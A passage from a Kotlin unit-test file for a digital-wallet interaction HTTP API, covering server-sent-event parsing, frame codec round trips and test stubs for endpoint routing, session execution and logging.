                "event: ${WalletInteractionApiConstants.Sse.EVENT_STATE}\n" +
                "data: ${defaultWalletInteractionJson.encodeToString(WalletInteractionStateEvent.serializer(), event)}\n"

        val parsed = WalletInteractionSseParser().parse(frame)

        assertEquals("0", parsed.id)
        assertEquals(state.sessionId, parsed.data.sessionId)
    }

    @Test
    fun frameCodecUsesUiSafeFrames() {
        val sessionId = WalletInteractionSessionId("s1")
        val frame =
            WalletInteractionClientFrame(
                type = WalletInteractionClientFrameType.DISPATCH_ACTION,
                sessionId = sessionId,
                action = WalletInteractionAction.continueFlow(),
                lastRevision = 1,
            )
        val codec = WalletInteractionFrameCodec()

        val encoded = codec.encodeClient(frame)
        val decoded = codec.decodeClient(encoded)

        assertEquals(WalletInteractionApiConstants.framePath("wallet", sessionId), "/api/wallet/interaction/v1/wallets/wallet/interactions/s1/frames")
        assertEquals(frame, decoded)
    }

    @Test
    fun serverStateFrameRoundTrips() {
        val state =
            WalletInteractionState.resolving(
                WalletInteractionSessionId("s1"),
                WalletInteractionInput("wallet", WalletEntryPoint.rawQr("qr")),
            )
        val codec = WalletInteractionFrameCodec()

        val encoded =
            codec.encodeServer(
                WalletInteractionServerFrame(
                    type = WalletInteractionServerFrameType.STATE,
                    sessionId = state.sessionId,
                    revision = state.revision,
                    state = state,
                ),
            )
        val decoded = codec.decodeServer(encoded)

        assertEquals(WalletInteractionServerFrameType.STATE, decoded.type)
        assertEquals(state, decoded.state)
    }

    private suspend fun start(adapter: TestWalletInteractionHttpAdapter): WalletInteractionSession {
        val response =
            adapter.handle(
                GenericHttpRequest.withTextBody(
                    method = "POST",
                    path = WalletInteractionApiConstants.interactionsPath("wallet"),
                    body =
                        defaultWalletInteractionJson.encodeToString(
                            StartWalletInteractionBody.serializer(),
                            StartWalletInteractionBody(WalletInteractionInput("wallet", WalletEntryPoint.rawQr("openid-credential-offer://?credential_offer=x"))),
                        ),
                ),
            )
        assertEquals(201, response.statusCode, response.body)
        return defaultWalletInteractionJson
            .decodeFromString(
                WalletInteractionSessionEnvelope.serializer(),
                requireBody(response.body),
            ).session
    }

    private suspend fun dispatch(
        adapter: TestWalletInteractionHttpAdapter,
        sessionId: WalletInteractionSessionId,
        expectedRevision: Long?,
    ): GenericHttpResponse =
        adapter.handle(
            GenericHttpRequest.withTextBody(
                method = "POST",
                path = WalletInteractionApiConstants.actionsPath("wallet", sessionId),
                body =
                    defaultWalletInteractionJson.encodeToString(
                        DispatchWalletInteractionActionBody.serializer(),
                        DispatchWalletInteractionActionBody(
                            action = WalletInteractionAction.continueFlow(),
                            expectedRevision = expectedRevision,
                        ),
                    ),
            ),
        )

    private fun testEngine(
        authority: StoreBackedWalletInteractionSensitiveInputAuthority =
            StoreBackedWalletInteractionSensitiveInputAuthority(InMemoryWalletInteractionPrivateSessionStore()),
        privateStore: InMemoryWalletInteractionPrivateSessionStore = InMemoryWalletInteractionPrivateSessionStore(),
        adapters: List<WalletInteractionProtocolAdapter> = listOf(StaticWalletInteractionProtocolAdapter.oid4vci()),
    ): DefaultWalletInteractionEngine =
        DefaultWalletInteractionEngine(
            sensitiveInputAuthority = authority,
            adapters = adapters,
            sessionIdGenerator = FixedWalletInteractionSessionIdGenerator(),
            privateSessionStore = privateStore,
            sessionStore = InMemoryWalletInteractionSessionStore(),
            // This fixture explicitly admits ordinary local interactions. Production
            // still rejects missing or ambiguous product launch authority.
            launchAuthorities = setOf(WalletInteractionLaunchAuthority { Ok(null) }),
            diagnostics = WalletInteractionDiagnostics.none,
        )

    private fun testAdapter(
        engine: DefaultWalletInteractionEngine,
        sensitiveInputAuthority: StoreBackedWalletInteractionSensitiveInputAuthority =
            StoreBackedWalletInteractionSensitiveInputAuthority(InMemoryWalletInteractionPrivateSessionStore()),
    ): TestWalletInteractionHttpAdapter {
        val execution = TestSessionExecution
        val startCommand = StartWalletInteractionCommandImpl(execution, engine)
        val resumeCommand = ResumeWalletInteractionCommandImpl(execution, engine)
        val submitActionCommand = SubmitWalletInteractionActionCommandImpl(execution, engine)
        val cancelCommand = CancelWalletInteractionCommandImpl(execution, engine)
        val getStateCommand = GetWalletInteractionStateCommandImpl(execution, engine)
        val getEventsCommand = GetWalletInteractionEventsCommandImpl(execution, engine)
        val registerSensitiveInputCommand =
            RegisterWalletInteractionSensitiveInputCommandImpl(
                execution,
                engine,
                sensitiveInputAuthority,
            )
        val consumeAuthorizationHandoffCommand =
            ConsumeWalletInteractionAuthorizationHandoffCommandImpl(
                execution,
                engine,
                sensitiveInputAuthority,
            )
        val listActivityCommand = ListWalletInteractionActivityCommandImpl(execution, engine)
        val endpoints =
            listOf(
                StartWalletInteractionHttpEndpointCommandImpl(execution, startCommand),
                ResumeWalletInteractionHttpEndpointCommandImpl(execution, resumeCommand),
                DispatchWalletInteractionActionHttpEndpointCommandImpl(execution, submitActionCommand, getStateCommand),
                CancelWalletInteractionHttpEndpointCommandImpl(execution, cancelCommand),
                GetWalletInteractionStateHttpEndpointCommandImpl(execution, getStateCommand),
                GetWalletInteractionEventsHttpEndpointCommandImpl(execution, getEventsCommand),
                HandleWalletInteractionFrameHttpEndpointCommandImpl(
                    execution = execution,
                    resumeCommand = resumeCommand,
                    submitActionCommand = submitActionCommand,
                    cancelCommand = cancelCommand,
                    stateCommand = getStateCommand,
                ),
                RegisterWalletInteractionSensitiveInputHttpEndpointCommandImpl(execution, registerSensitiveInputCommand),
                ConsumeWalletInteractionAuthorizationHandoffHttpEndpointCommandImpl(execution, consumeAuthorizationHandoffCommand),
                ListWalletInteractionActivityHttpEndpointCommandImpl(execution, listActivityCommand),
            )
        val registry = TestWalletEndpointCommandRegistry(endpoints)
        return TestWalletInteractionHttpAdapter(
            adapter = WalletInteractionHttpAdapter(execution = execution, endpointCommandRegistry = registry),
            registry = registry,
        )
    }
}

private class TestWalletEndpointCommandRegistry(
    commands: List<HttpEndpointCommand>,
) : HttpEndpointCommandRegistry {
    private val commandsById = commands.associateBy { it.id }

    override fun get(handlerCommandId: String): HttpEndpointCommand? = commandsById[handlerCommandId]

    override fun listHandlerCommandIds(): Set<String> = commandsById.keys

    fun commands(): Collection<HttpEndpointCommand> = commandsById.values
}

private class TestWalletInteractionHttpAdapter(
    private val adapter: WalletInteractionHttpAdapter,
    private val registry: TestWalletEndpointCommandRegistry,
) {
    suspend fun handle(request: GenericHttpRequest): GenericHttpResponse {
        val mount = adapter.describe().mount
        val relativePath = request.path.removePrefix(mount.adapterBasePath).ifEmpty { "/" }
        val relativeRequest = request.copy(path = relativePath)
        val command =
            registry.commands()
                .mapNotNull { candidate ->
                    val pattern =
                        candidate.endpoint.pathPatterns
                            .filter { relativeRequest.matches(candidate.endpoint.method.name, it) }
                            .maxByOrNull { it.length } ?: return@mapNotNull null
                    candidate to pattern
                }
                .maxByOrNull { it.second.length }
                ?.first ?: return GenericHttpResponse(404, emptyMap(), "Not found")
        val endpointPattern =
            command.endpoint.pathPatterns
                .filter { relativeRequest.matches(command.endpoint.method.name, it) }
                .maxByOrNull { it.length } ?: return GenericHttpResponse(404, emptyMap(), "Not found")
        val route =
            HttpAdapterRouteMatch(
                adapterId = adapter.id,
                method = request.method,
                originalPath = request.path,
                normalizedPath = request.path,
                matchedPathPattern = mount.adapterBasePath.trimEnd('/') + "/" + endpointPattern.trimStart('/'),
                handlerCommandId = command.id,
                tenantIdFromPath = null,
            )
        return adapter.handleResolvedRequest(route.applyTo(request), route)
    }
}

private fun requireBody(body: String?): String = requireNotNull(body)

private val TestSessionExecution: SessionExecution = TestSessionExecutionImpl()

private class TestSessionExecutionImpl : SessionExecution {
    override val sessionContext: SessionContext = NoOpSessionContext
    override val sessionContextManager: SessionContextManager
        get() = throw NotImplementedError("test")
    override val log: SessionLogService = NoOpSessionLogService(sessionContext)
    override val conf: ContextConfig = NoOpContextConfig()
}

private class NoOpSessionLogService(
    override val sessionContext: SessionContext,
) : SessionLogService {
    override val id: String = "wallet-interaction-http-test-log"
    override val isEnabled: Boolean = false
    override val scope: IdkScope = IdkScope.SESSION
    override val logManager: SessionLogManager
        get() = throw NotImplementedError("test")

    override suspend fun setConfig(config: LoggerConfig): LogService = this

    override fun executeAsync(message: LogMessage): IdkResult<Unit, IdkErrorType> = Ok(Unit)

    override fun toAsync(): AsyncLogService = throw NotImplementedError("test")
}

private class NoOpContextConfig : ContextConfig {
    override val app: AppConfigService
        get() = throw NotImplementedError("test")
    override val tenant: TenantConfigService
        get() = throw NotImplementedError("test")
    override val principal: PrincipalConfigService
        get() = throw NotImplementedError("test")

    override fun conf(level: ConfigLevel): ConfigService = throw NotImplementedError("test")
}
